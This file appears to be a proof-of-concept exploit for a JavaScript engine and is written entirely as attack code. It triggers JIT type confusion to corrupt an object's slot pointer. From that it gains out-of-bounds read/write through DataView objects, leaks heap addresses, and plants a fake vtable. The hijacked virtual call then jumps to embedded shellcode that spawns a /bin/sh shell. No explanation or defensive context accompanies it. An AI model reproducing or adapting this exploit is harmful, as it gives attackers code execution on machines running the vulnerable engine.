dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

let shellcode = []           // store shellcode
let oshell={'a':1}               // fake its vtable
let shellcode_val=[
    0x622fb848, 0x732f6e69, 
    0x48500068, 0xf631e789, 0xc748d231, 0x3bc0, 0x50f00
]
let fake_vtable=[shellcode,shellcode,shellcode,shellcode,shellcode,shellcode,shellcode,shellcode,shellcode,shellcode,
    shellcode, shellcode, shellcode, shellcode, shellcode, shellcode, shellcode,shellcode,shellcode,
]

function changeType(o, proto, value) {
    o.b = 1;
    let tmp = { __proto__: proto };
    o.a = value;
}

function hex(x){
    print("0x"+x.toString(16))
}
function mergehex(h,l){
    hex(h*0x100000000+l)
}
function main(){
    for(let i=0;i<20000;i++){
        let o={a:1,b:2};
        changeType(o,(function (){}),{});
    }
    let o={a:1,b:2};
    changeType(o,o,obj);   // o->auxslots=obj

    o.c=dv1;        // obj->auxslots=dv1
    obj.h=shellcode;          // dv1->buffer=shellcode
    // addressOf(shellcode)

    for(i=0;i<shellcode_val.length;i++){
        dv1.setUint32(i*4,shellcode_val[i],true);
    }
    shellcode_addr_lo=dv1.getUint32(0x30,true)
    shellcode_addr_hi=dv1.getUint32(0x34,true)
    shellcode_addr = shellcode_addr_hi * 0x100000000 + shellcode_addr_lo-0x40
    oshell_addr = shellcode_addr - 0x39710


    obj.h=fake_vtable // dv1->buf=fake_vtable
    fake_vtable_lo=dv1.getUint32(0x28,true)
    fake_vtable_hi=dv1.getUint32(0x2c,true)
    fake_vatble_addr = fake_vtable_hi * 0x100000000+fake_vtable_lo+0x18

    obj.h=oshell        // dv1->buf=oshell
    // oshell->vtable_ptr=fake_vtable_addr
    dv1.setUint32(0,fake_vtable_lo+0x18,true)
    dv1.setUint32(4,fake_vtable_hi,true)

    hex(fake_vatble_addr)
    addressOf(dv1)
    addressOf(oshell)
    hex(shellcode_addr)
    // breakpoint()
    oshell['a']
}
main()